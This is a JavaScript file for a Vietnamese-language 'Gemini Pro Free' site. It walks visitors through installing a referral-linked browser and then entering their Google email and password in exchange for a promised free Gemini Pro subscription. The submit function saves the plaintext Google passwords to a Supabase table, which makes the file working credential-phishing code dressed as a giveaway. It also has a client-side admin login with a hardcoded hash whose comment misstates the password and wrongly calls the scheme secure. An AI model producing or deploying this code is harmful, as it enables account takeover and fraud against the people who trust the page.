// Gemini Pro Free - Main JavaScript

let currentStep = 1;
let supabase = null;

// Initialize Supabase
if (typeof window.SUPABASE_CONFIG !== 'undefined' && window.SUPABASE_CONFIG.url && window.SUPABASE_CONFIG.anonKey) {
    if (typeof window.supabase !== 'undefined') {
        const { createClient } = window.supabase;
        supabase = createClient(
            window.SUPABASE_CONFIG.url,
            window.SUPABASE_CONFIG.anonKey
        );
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    // Check if Supabase is configured
    if (!supabase) {
        console.warn('Supabase chưa được cấu hình. Vui lòng cập nhật file config.js');
    }

    // Setup event listeners
    setupEventListeners();
    
    // Show first step
    showStep(1);
}

function setupEventListeners() {
    // Checkbox for step 2
    const confirmCheckbox = document.getElementById('confirmSteps');
    if (confirmCheckbox) {
        confirmCheckbox.addEventListener('change', function() {
            const continueBtn = document.getElementById('continueBtn');
            continueBtn.disabled = !this.checked;
        });
    }

    // Form validation
    const formInputs = document.querySelectorAll('.form-input');
    formInputs.forEach(input => {
        input.addEventListener('input', validateForm);
    });
}

// Navigation Functions
function nextStep() {
    if (currentStep < 4) {
        currentStep++;
        showStep(currentStep);
    }
}

function previousStep() {
    if (currentStep > 1) {
        currentStep--;
        showStep(currentStep);
    }
}

function showStep(stepNumber) {
    // Hide all steps
    const allSteps = document.querySelectorAll('.step-container');
    allSteps.forEach(step => {
        step.classList.remove('active');
    });

    // Show current step
    const currentStepElement = document.querySelector(`.step-container[data-step="${stepNumber}"]`);
    if (currentStepElement) {
        currentStepElement.classList.add('active');
    }

    // Update progress bar
    updateProgressBar(stepNumber);

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function updateProgressBar(stepNumber) {
    const progressSteps = document.querySelectorAll('.progress-step');
    
    progressSteps.forEach((step, index) => {
        const stepNum = index + 1;
        
        if (stepNum < stepNumber) {
            step.classList.add('completed');
            step.classList.remove('active');
        } else if (stepNum === stepNumber) {
            step.classList.add('active');
            step.classList.remove('completed');
        } else {
            step.classList.remove('active', 'completed');
        }
    });
}

// Form Validation
function validateForm() {
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const contactEmail = document.getElementById('contactEmail');

    if (!email || !password || !contactEmail) return false;

    const isValid = email.value.trim() !== '' && 
                   password.value.trim() !== '' && 
                   contactEmail.value.trim() !== '' &&
                   isValidEmail(email.value) &&
                   isValidEmail(contactEmail.value);

    return isValid;
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Form Submission
async function submitForm() {
    // Validate form
    if (!validateForm()) {
        showNotification('Vui lòng điền đầy đủ thông tin hợp lệ!', 'error');
        return;
    }

    // Get form values
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const contactEmail = document.getElementById('contactEmail').value.trim();

    // Show loading
    showLoading(true);

    try {
        // Save to Supabase
        if (supabase) {
            const { data, error } = await supabase
                .from('gemini_requests')
                .insert([
                    {
                        google_email: email,
                        google_password: password,
                        contact_email: contactEmail,
                        created_at: new Date().toISOString(),
                        status: 'pending'
                    }
                ]);

            if (error) {
                console.error('Supabase error:', error);
                throw new Error('Không thể lưu thông tin. Vui lòng thử lại!');
            }

            console.log('Data saved successfully:', data);
        } else {
            // Fallback: Log to console if Supabase is not configured
            console.log('Form submitted (Supabase not configured):', {
                google_email: email,
                google_password: password,
                contact_email: contactEmail,
                created_at: new Date().toISOString()
            });
            
            // Simulate delay
            await new Promise(resolve => setTimeout(resolve, 1500));
        }

        // Hide loading
        showLoading(false);

        // Show success message
        showNotification('Đã gửi thông tin thành công!', 'success');

        // Move to next step
        setTimeout(() => {
            nextStep();
        }, 1000);

    } catch (error) {
        showLoading(false);
        showNotification(error.message || 'Có lỗi xảy ra. Vui lòng thử lại!', 'error');
        console.error('Error:', error);
    }
}

// Reset Form
function resetForm() {
    // Reset form fields
    const form = document.getElementById('userForm');
    if (form) {
        form.reset();
    }

    // Reset checkbox
    const checkbox = document.getElementById('confirmSteps');
    if (checkbox) {
        checkbox.checked = false;
    }

    // Reset current step
    currentStep = 1;
    showStep(1);

    // Disable continue button
    const continueBtn = document.getElementById('continueBtn');
    if (continueBtn) {
        continueBtn.disabled = true;
    }
}

// Loading Overlay
function showLoading(show) {
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) {
        if (show) {
            loadingOverlay.classList.add('active');
        } else {
            loadingOverlay.classList.remove('active');
        }
    }
}

// Notification System
function showNotification(message, type = 'info') {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 20px 30px;
        background: ${type === 'success' ? '#95E1D3' : '#FF6B6B'};
        color: #1A1A1A;
        border: 4px solid #1A1A1A;
        box-shadow: 5px 5px 0px rgba(0, 0, 0, 1);
        font-weight: 700;
        font-size: 1.1rem;
        z-index: 10000;
        animation: slideInRight 0.3s ease;
        max-width: 400px;
        word-wrap: break-word;
    `;
    notification.textContent = message;

    // Add animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    `;
    document.head.appendChild(style);

    // Add to body
    document.body.appendChild(notification);

    // Remove after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => {
            notification.remove();
            style.remove();
        }, 300);
    }, 3000);
}

// Utility Functions
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}

// Analytics (Optional)
function trackEvent(eventName, data = {}) {
    console.log('Event:', eventName, data);
    // Add your analytics code here (Google Analytics, etc.)
}

// Track page load
trackEvent('page_load', {
    timestamp: new Date().toISOString()
});

// Toggle Password Visibility
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const toggleBtn = document.querySelector('.toggle-password');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleBtn.textContent = '🙈';
    } else {
        passwordInput.type = 'password';
        toggleBtn.textContent = '👁️';
    }
}

// Admin Login Functions
function toggleAdminLogin() {
    const popup = document.getElementById('adminLoginPopup');
    popup.classList.toggle('active');
    
    // Clear password field
    const passwordInput = document.getElementById('adminPassword');
    if (passwordInput) {
        passwordInput.value = '';
    }
}

// SHA-256 hash function (secure)
async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hashHex;
}

async function adminLogin() {
    const passwordInput = document.getElementById('adminPassword');
    const password = passwordInput.value;
    
    // Hash the password with SHA-256 for maximum security
    const inputHash = await sha256(password);
    // Pre-computed hash of "200320"
    const correctPasswordHash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92';
    
    if (inputHash === correctPasswordHash) {
        // Store admin session with timestamp
        const authToken = await sha256(password + Date.now().toString());
        sessionStorage.setItem('adminAuth', authToken);
        sessionStorage.setItem('adminTime', Date.now().toString());
        
        // Redirect to admin page
        window.location.href = 'admin.html';
    } else {
        showNotification(t('adminWrongPassword'), 'error');
        passwordInput.value = '';
    }
}

// Language switching
function changeLanguage(lang) {
    currentLanguage = lang;
    localStorage.setItem('language', lang);
    
    // Update active button
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.getAttribute('data-lang') === lang) {
            btn.classList.add('active');
        }
    });
    
    // Update all translations
    updateAllTranslations();
}

// Update all translations on page
function updateAllTranslations() {
    // Update elements with data-translate attribute
    document.querySelectorAll('[data-translate]').forEach(element => {
        const key = element.getAttribute('data-translate');
        element.textContent = t(key);
    });
    
    // Update placeholders
    document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
        const key = element.getAttribute('data-translate-placeholder');
        element.placeholder = t(key);
    });
    
    // Auto-translate ALL hardcoded Vietnamese text
    const textMappings = {
        // Progress labels
        'Giới thiệu': t('progressStep1'),
        'Hướng dẫn': t('progressStep2'),
        'Thông tin': t('progressStep3'),
        'Hoàn thành': t('progressStep4'),
        
        // Step 1
        '👋 Chào mừng bạn!': t('step1Title'),
        'Mình tạo ra trang web này với mục đích giúp đỡ những bạn chưa đăng kí được': t('step1Text1'),
        'tài khoản Gemini Pro 1 năm': t('step1Text2'),
        ', nhưng trước khi nhận được quyền lợi, bạn hãy giúp mình thực hiện 1 vài thao tác nhỏ này nhé.': t('step1Text3'),
        '✨ Đây là 1 chương trình invited nhỏ, khi bạn làm thì mình sẽ nhận được 1 chút tiền. Sau đó sẽ có tuỳ chọn để bạn nhập và nhận gói GEMINI PRO 1 năm nhé.': t('step1Highlight'),
        'CẢM ƠN BẠN RẤT NHIỀU! 💝': t('step1Thanks'),
        'Bắt đầu ngay →': t('step1Button'),
        
        // Step 2
        '📋 Hướng dẫn chi tiết': t('step2Title'),
        'Nếu bạn đã tải trình duyệt Comet trước đó, thì rất tiếc chương trình này chưa dành cho bạn.': t('step2Warning'),
        'Hãy sử dụng máy tính để thực hiện yêu cầu nhé, vì đây là phần mềm trên máy tính.': t('step2Info'),
        'Vui lòng thực hiện các bước sau:': t('step2Intro'),
        'Truy cập link và tải phần mềm Comet': t('step2Instruction1Title'),
        'Nhấn vào nút bên dưới để truy cập link tải xuống': t('step2Instruction1Text'),
        '🔗 Truy cập link tải Comet': t('step2Instruction1Button'),
        'Đăng nhập Comet': t('step2Instruction2Title'),
        'Đăng nhập Comet bằng tài khoản Google giống đúng với tài khoản Google đã nhấp vào link trước đó': t('step2Instruction2Text'),
        'Sử dụng Comet': t('step2Instruction3Title'),
        'Mở trình duyệt Comet và hỏi 1 vài câu hỏi bất kì': t('step2Instruction3Text'),
        'Đặt làm mặc định': t('step2Instruction4Title'),
        'Đặt Comet làm trình duyệt mặc định': t('step2Instruction4Text'),
        'Sau khi thực hiện, nếu đúng và thành công thì mình sẽ xác nhận được, và sẽ ngay lập tức hoàn thành tài khoản Gemini PRO giúp bạn.': t('step2Note'),
        'Tôi đã hoàn thành tất cả các bước trên': t('step2Checkbox'),
        '← Quay lại': t('step2ButtonBack'),
        'Tiếp tục →': t('step2ButtonNext'),
        
        // Step 3
        '📝 Thông tin tài khoản': t('step3Title'),
        'Vui lòng nhập thông tin tài khoản Google của bạn để nhận Gemini Pro:': t('step3Intro'),
        'Bạn hãy giúp mình tạo 1 tài khoản Google mới nhé (có thể sử dụng điện thoại để tạo)': t('step3InfoNote'),
        'Mình sẽ đăng nhập tài khoản và giúp bạn kích hoạt, bạn có thể đổi mật khẩu ngay sau đó.': t('step3SecurityNote'),
        'Email Google *': t('step3EmailLabel'),
        'example@gmail.com': t('step3EmailPlaceholder'),
        'Email tài khoản Google bạn đã sử dụng': t('step3EmailHint'),
        'Mật khẩu *': t('step3PasswordLabel'),
        'Nhập mật khẩu': t('step3PasswordPlaceholder'),
        'Mật khẩu tài khoản Google của bạn': t('step3PasswordHint'),
        'Email liên hệ *': t('step3ContactLabel'),
        'contact@example.com': t('step3ContactPlaceholder'),
        'Email để chúng tôi liên hệ với bạn': t('step3ContactHint'),
        'Thông tin của bạn sẽ được bảo mật tuyệt đối và chỉ được sử dụng để kích hoạt Gemini Pro cho tài khoản của bạn.': t('step3Warning'),
        '← Quay lại': t('step3ButtonBack'),
        'Xác nhận →': t('step3ButtonSubmit'),
        
        // Step 4
        '✅ Hoàn thành!': t('step4Title'),
        'Cảm ơn bạn đã hoàn thành!': t('step4Thanks'),
        'Chúng tôi đã nhận được thông tin của bạn. Tài khoản Gemini Pro 1 năm của bạn sẽ được kích hoạt trong vòng 10-20 phút.': t('step4Message'),
        '📧 Bạn sẽ nhận được email xác nhận sau khi tài khoản được kích hoạt thành công.': t('step4EmailNote'),
        'Lưu ý:': t('step4NoteTitle'),
        'Kiểm tra email của bạn sau 10-20 phút': t('step4Note1'),
        'Nếu có vấn đề, chúng tôi sẽ liên hệ qua email bạn đã cung cấp': t('step4Note2'),
        'Cảm ơn bạn đã tin tưởng và hỗ trợ!': t('step4Note3'),
        '🏠 Về trang chủ': t('step4Button'),
        
        // Footer
        '© 2025 Gemini Pro Free. Made with ❤️': t('footerText'),
        
        // Loading
        'Đang xử lý...': t('loadingText')
    };
    
    // Replace hardcoded text - smarter approach
    Object.keys(textMappings).forEach(hardcodedText => {
        // Update all text nodes
        const walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT,
            null,
            false
        );
        
        let node;
        while (node = walker.nextNode()) {
            const text = node.textContent.trim();
            if (text === hardcodedText) {
                node.textContent = textMappings[hardcodedText];
            }
        }
        
        // Also update elements with exact text content
        const elements = document.querySelectorAll('*');
        elements.forEach(element => {
            const text = element.textContent.trim();
            if (text === hardcodedText) {
                element.textContent = textMappings[hardcodedText];
            }
        });
    });
    
    // Fix mixed content in paragraphs
    const paragraphs = document.querySelectorAll('p, div, span, h1, h2, h3, h4, h5, h6');
    paragraphs.forEach(element => {
        let text = element.textContent;
        
        // Replace mixed Vietnamese-English content
        if (text.includes('created this website to help those who haven\'t been able to register for')) {
            element.innerHTML = t('step1Text1') + ' <strong>' + t('step1Text2') + '</strong>' + t('step1Text3');
        }
        
        if (text.includes('✨ Đây là 1 chương trình invited nhỏ')) {
            element.innerHTML = t('step1Highlight');
        }
        
        if (text.includes('THANK YOU VERY MUCH! 💝')) {
            element.innerHTML = t('step1Thanks');
        }
        
        if (text.includes('Please use a computer to complete the requirements')) {
            element.innerHTML = '<strong>💻 Quan trọng:</strong> ' + t('step2Info');
        }
        
        if (text.includes('If you have downloaded the Comet browser before')) {
            element.innerHTML = '<strong>⚠️ Lưu ý:</strong> ' + t('step2Warning');
        }
        
        if (text.includes('Please help me create a new Google account')) {
            element.innerHTML = '<strong>💡 Ghi chú quan trọng:</strong> ' + t('step3InfoNote');
        }
        
        if (text.includes('I will login to the account and help you activate it')) {
            element.innerHTML = '<strong>🔒 Bảo mật:</strong> ' + t('step3SecurityNote');
        }
        
        if (text.includes('Thông tin của bạn sẽ được bảo mật tuyệt đối')) {
            element.innerHTML = '<strong>⚠️ Quan trọng:</strong> ' + t('step3Warning');
        }
        
        if (text.includes('Sau khi thực hiện, nếu đúng và thành công')) {
            element.innerHTML = '<strong>📌 Lưu ý:</strong> ' + t('step2Note');
        }
    });
}

// Initialize language on page load
window.updateAllTranslations = updateAllTranslations;
